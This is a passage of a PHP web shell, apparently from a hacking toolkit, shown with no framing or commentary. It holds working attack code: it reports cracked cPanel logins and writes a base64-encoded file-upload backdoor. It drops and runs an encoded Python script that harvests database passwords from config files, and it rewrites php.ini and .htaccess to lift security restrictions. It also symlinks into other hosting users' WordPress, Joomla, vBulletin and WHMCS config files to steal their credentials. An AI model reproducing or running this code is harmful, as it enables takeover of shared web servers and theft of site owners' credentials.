                                echo "D4rkj1n~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
                                ++$ok;
                            }
                        }
                    }
                }
                echo "<hr><b>You Found <font color=green>$ok</font> Cpanel by x'1n73ct</b>";
                echo '<center><b><a href=' . $_SERVER['PHP_SELF'] . '>BACK</a>';
                exit;
            }
        }
        if ('password' == $_POST['pass']) {
            @error_reporting(0);
            $i = getenv('REMOTE_ADDR');
            $d = date('D, M jS, Y H:i', time());
            $h = $_SERVER['HTTP_HOST'];
            $dir = $_SERVER['PHP_SELF'];
            $back = 'PD9waHANCmVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7DQplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsNCmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsNCmlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7IGVjaG8gJzxiPktvcmFuZyBEYWggQmVyamF5YSBVcGxvYWQgU2hlbGwgS29yYW5nISEhPGI+PGJyPjxicj4nOyB9DQplbHNlIHsgZWNobyAnPGI+S29yYW5nIEdhZ2FsIFVwbG9hZCBTaGVsbCBLb3JhbmchISE8L2I+PGJyPjxicj4nOyB9DQp9DQo/Pg==';
            $file = fopen('.php', 'w+');
            $write = fwrite($file, base64_decode($back));
            fclose($file);
            chmod('.php', 0755);
            mkdir('config', 0755);
            $cp = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
            $file = fopen('cp.py', 'w+');
            $write = fwrite($file, base64_decode($cp));
            fclose($file);
            chmod('cp.py', 0755);
            $url = $_POST['url'];
            echo '<center>
<textarea cols="90" rows="20" name="usernames">';
            system("python cp.py $url config");
            unlink('cp.py');
            echo '</textarea>
</center>';
            echo '<hr><center><b><a href=' . $_SERVER['PHP_SELF'] . '>BACK</a>';
            exit;
        }
        if ('sekatan' == $_POST['matikan']) {
            @error_reporting(0);
            $phpini = 'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
            $file = fopen('php.ini', 'w+');
            $write = fwrite($file, base64_decode($phpini));
            fclose($file);
            $htaccess = 'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
            $file = fopen('.htaccess', 'w+');
            $write = fwrite($file, base64_decode($htaccess));
            echo '<hr><center><b>DONE!';
            echo '<hr><center><b><a href=' . $_SERVER['PHP_SELF'] . '>BACK</a>';
            exit;
        }
        if ('passwd' == $_POST['mendapatkan']) {
            @set_magic_quotes_runtime(0);
            ob_start();
            error_reporting(0);
            @set_time_limit(0);
            @ini_set('max_execution_time', 0);
            @ini_set('output_buffering', 0);
            $fn = $_POST['foldername'];
            //all function here
            function syml($usern, $pdomain)
            {
                symlink('/home/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
                symlink('/home/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
                symlink('/home/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
                symlink('/home/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
                symlink('/home/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
                symlink('/home/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
                symlink('/home/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
                symlink('/home/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
                symlink('/home/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
                symlink('/home/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
                symlink('/home/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
                symlink('/home/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
                symlink('/home/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
                symlink('/home/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
                symlink('/home/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
                symlink('/home/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
                symlink('/home/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
                symlink('/home/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
                symlink('/home/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
                symlink('/home/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
                symlink('/home/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
                symlink('/home/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
                symlink('/home/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
                symlink('/home/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
                symlink('/home/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
                symlink('/home/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
                symlink('/home/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
                symlink('/home/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
                symlink('/home/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
                symlink('/home/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
                symlink('/home2/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
                symlink('/home2/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
                symlink('/home2/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
                symlink('/home2/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
                symlink('/home2/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
                symlink('/home2/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
                symlink('/home2/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
                symlink('/home2/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
                symlink('/home2/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
                symlink('/home2/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
                symlink('/home2/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
                symlink('/home2/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
                symlink('/home2/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
                symlink('/home2/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
                symlink('/home2/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
                symlink('/home2/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
                symlink('/home2/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
                symlink('/home2/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
                symlink('/home2/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
                symlink('/home2/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
                symlink('/home2/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
                symlink('/home2/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
                symlink('/home2/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
                symlink('/home2/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
                symlink('/home2/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
                symlink('/home2/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
                symlink('/home2/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
                symlink('/home2/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
                symlink('/home2/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
                symlink('/home2/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
                symlink('/home3/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
                symlink('/home3/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
                symlink('/home3/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
                symlink('/home3/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
                symlink('/home3/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
                symlink('/home3/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
                symlink('/home3/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
                symlink('/home3/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
                symlink('/home3/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
                symlink('/home3/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
                symlink('/home3/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
                symlink('/home3/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
                symlink('/home3/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
                symlink('/home3/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
                symlink('/home3/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
                symlink('/home3/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
                symlink('/home3/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
                symlink('/home3/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
                symlink('/home3/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
                symlink('/home3/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
                symlink('/home3/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
                symlink('/home3/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
                symlink('/home3/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
                symlink('/home3/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
                symlink('/home3/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
                symlink('/home3/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
                symlink('/home3/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
                symlink('/home3/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
                symlink('/home3/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
                symlink('/home3/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
                symlink('/home4/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
                symlink('/home4/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
                symlink('/home4/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
                symlink('/home4/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
                symlink('/home4/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
                symlink('/home4/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
                symlink('/home4/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
                symlink('/home4/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
                symlink('/home4/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
                symlink('/home4/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
                symlink('/home4/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
                symlink('/home4/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
                symlink('/home4/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
                symlink('/home4/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
                symlink('/home4/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
                symlink('/home4/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
                symlink('/home4/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
                symlink('/home4/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
                symlink('/home4/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
                symlink('/home4/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
                symlink('/home4/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
                symlink('/home4/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
                symlink('/home4/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
                symlink('/home4/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
                symlink('/home4/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
                symlink('/home4/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
                symlink('/home4/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
                symlink('/home4/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
                symlink('/home4/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
                symlink('/home4/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
                symlink('/home5/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
                symlink('/home5/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
                symlink('/home5/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
                symlink('/home5/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
                symlink('/home5/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
                symlink('/home5/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
                symlink('/home5/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
                symlink('/home5/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
                symlink('/home5/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
